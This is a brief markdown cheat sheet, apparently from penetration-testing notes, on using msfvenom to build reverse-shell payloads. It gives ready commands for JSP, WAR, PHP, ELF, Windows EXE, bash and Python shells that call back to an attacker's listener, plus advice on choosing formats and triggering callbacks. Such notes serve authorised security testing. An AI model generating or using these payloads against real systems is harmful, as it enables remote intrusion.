# msfvenom

## Why It Matters

`msfvenom` is mainly a payload generation tool. Its value is in matching the payload to:

- target platform
- file format
- delivery method
- listener expectations

Use it after you already have an upload or execution path. It is not the exploit by itself.

## Workflow

1. identify target OS and runtime
2. choose the simplest payload that fits the delivery path
3. generate the right output format
4. set up the listener first
5. trigger and validate the callback

## Common Payload Types

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war > shell.war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.jsp
msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -f raw > shell.php
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe
msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw > shell.sh
msfvenom -p cmd/unix/reverse_python LHOST=<ip> LPORT=<port> -f raw > shell.py
```

## Selection Logic

Prefer:

- the simplest payload the target will execute
- raw script payloads when you already have script execution
- native format payloads only when upload and execution match

Do not default to Meterpreter unless it is actually useful for the scenario.

## Pitfalls

- generating the wrong format for the target
- forgetting to start the listener first
- using heavier payloads when a raw one-liner would do

## Reporting Notes

`msfvenom` output is usually not the finding. It is just a delivery helper used after exploitation succeeded.

## Fast Checklist

```text
1. Confirm target OS and runtime
2. Choose the lightest matching payload
3. Generate the right format
4. Start the listener
5. Upload, trigger, and validate the callback
```
